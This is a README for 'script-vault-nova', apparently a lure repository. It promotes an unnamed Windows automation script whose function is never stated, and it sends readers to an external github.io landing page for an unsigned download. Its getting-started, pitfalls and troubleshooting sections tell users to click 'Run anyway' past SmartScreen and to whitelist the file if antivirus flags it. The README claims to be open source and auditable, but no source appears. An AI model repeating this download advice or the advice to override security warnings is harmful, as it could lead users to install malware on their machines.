<div align="center">
<img src="assets/banner.svg" width="100%" alt="Script banner"/>
</div>

# script-vault-nova

![Version-2026](https://img.shields.io/badge/VERSION-2026-4F46E5?style=for-the-badge)
![Windows](https://img.shields.io/badge/WINDOWS-10%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![License-MIT](https://img.shields.io/badge/LICENSE-MIT-green?style=for-the-badge)

*One tidy Windows script that replaces the folder of half-broken .bat files every power user has been dragging around since 2019.*

</div>

> **TL;DR**
> - script-vault-nova packages one carefully maintained automation script instead of forcing you to hunt for "the best script" across sketchy forum threads.
> - It runs standalone on Windows 10/11 — no runtime install, no dependency chain, no toolchain setup.
> - You download it from the project's landing page, run it, and it just does the job it was built for.

## How this compares

People searching for "the best script" usually land on one of three things. Here's the honest breakdown.

| | script-vault-nova | Random forum .bat file | Full automation framework |
|---|---|---|---|
| Setup time | ~1 minute | 5–30 min (if it even works) | Hours, plus config |
| Dependencies | None | Sometimes hidden ones | Runtime + libraries |
| Maintained | Yes, versioned releases | Rarely | Depends on project |
| Transparency | Open source, readable | Copy-pasted, unclear origin | Open source, but sprawling |
| Best for | One job, done well | Nothing you should trust | Large, multi-step pipelines |

## What this is

script-vault-nova is a small, self-contained Windows script and its launcher, published under the working name "the best script" because that's genuinely the goal — not a marketing label. Instead of a sprawling toolkit with fifty features you'll never touch, this repository holds one script that's been rewritten, trimmed, and tested until the failure modes are gone. If you've ever downloaded three different automation scripts in one afternoon because none of them worked twice in a row, this is built for that exact frustration.

The project is intentionally narrow in scope. There's no plugin ecosystem, no config language to learn, no background service quietly eating your CPU. You get a single executable-style script that does what it says, logs what it did, and exits cleanly. Version history lives in this repo so you can see exactly what changed between builds — no silent rewrites, no mystery behavior between updates.

<p align="center">
  <a href="https://VampireCenterWar.github.io/script-vault-nova/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Build-4F46E5?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>
</p>

<p align="center"><sub>The button opens the project's landing page, where the current build is available to download.</sub></p>

## Who it is for

- **Windows power users** tired of maintaining a graveyard of half-working .bat and .ps1 files.
- **IT and helpdesk folks** who need one reliable script to hand off to non-technical coworkers.
- **Homelab and small-office admins** who want automation without standing up a full orchestration stack.
- **Developers on Windows** who want a repeatable setup step without writing yet another wrapper script.
- **Anyone who searched "the best script" today** and just wants something that works on the first run.

## What you can do

- **Run it standalone** — no interpreter, no runtime, no background install step.
- **See exactly what it changed** — every run writes a plain-text log next to the executable.
- **Re-run safely** — the script checks its own prior state before acting, so double-clicking twice won't break anything.
- **Skip the config file hunt** — sane defaults are baked in; advanced flags are optional, not required.
- **Audit the source** — this is a public repo, not a black box; read the script before you trust it.
- **Update without reinstalling** — new builds are versioned releases on the landing page, drop-in replacements.
- **Roll back if needed** — older builds stay listed so you're never stuck on a broken release.
- **Use it offline** — once downloaded, it doesn't phone home to run.

## Getting started

1. Open the [landing page](https://VampireCenterWar.github.io/script-vault-nova/).
2. Click the download button for the current build.
3. Move the downloaded file to a folder you control (Desktop or Downloads is fine).
4. Run it — Windows may show a SmartScreen prompt for unsigned software; choose "Run anyway" if you've verified the source.
5. Check the generated log file if you want to see exactly what happened.

## Requirements

- Windows 10 or Windows 11, 64-bit.
- No toolchain, compiler, or package manager required.
- No admin rights needed for standard use (some automation targets may prompt for elevation).
- ~15 MB of free disk space for the script and its logs.

## How it works

The script follows a deliberately short pipeline so there's nothing surprising happening between "run" and "done."

```mermaid
graph LR
A[Launch] --> B[Check prior state]
B --> C[Run automation steps]
C --> D[Write log file]
D --> E[Exit cleanly]
```

1. On launch, it checks whether it's been run before in this location.
2. It reads its baked-in defaults (no external config fetch).
3. It performs the automation steps in sequence, stopping immediately if one fails.
4. It writes a timestamped log so you can see what actually happened.
5. It exits — no background process, no leftover service.

## Common Pitfalls

**"I downloaded it but Windows won't let me open it."**
That's SmartScreen being cautious with unsigned executables. Click "More info" then "Run anyway" — only do this if you got the file from the official landing page.

**"The log says it skipped everything."**
That usually means the script detected it already ran successfully in this folder. Delete the log file if you want a clean re-run, or move the script to a fresh folder.

**"It ran but nothing seemed to change."**
Check the log first — most "nothing happened" reports turn out to be the script finishing successfully with zero errors, which just means there was nothing to fix.

**"Is this the same as the version I found on a forum months ago?"**
Almost certainly not. Forum copies drift from the source fast. Always pull from the landing page listed in this repository to get the current, maintained build.

**"Can I modify the script for my own use case?"**
Yes — it's MIT licensed. Fork it, read it, change it. Just don't expect support for a heavily modified copy.

## Troubleshooting

- **Script closes instantly with no window.** Run it from a terminal (`cmd` or PowerShell) instead of double-clicking, so any error message stays visible instead of vanishing with the window.
- **Antivirus flags the download.** This is common for small unsigned utilities. Check the file hash against the one listed on the landing page before whitelisting it.
- **Log file isn't being created.** The script needs write permission in its own folder — move it out of a restricted directory like `Program Files` and try again.
- **Build seems outdated compared to what's described here.** Always re-check the landing page; this README tracks the current release, not archived ones.

## License

Released under the [MIT License](LICENSE). Use it, modify it, redistribute it — just keep the license notice intact. This project is provided as-is, with no warranty; you're responsible for verifying it fits your use case before running it in any production or shared environment.

<p align="center">
  <a href="https://VampireCenterWar.github.io/script-vault-nova/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Build-4F46E5?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>
</p>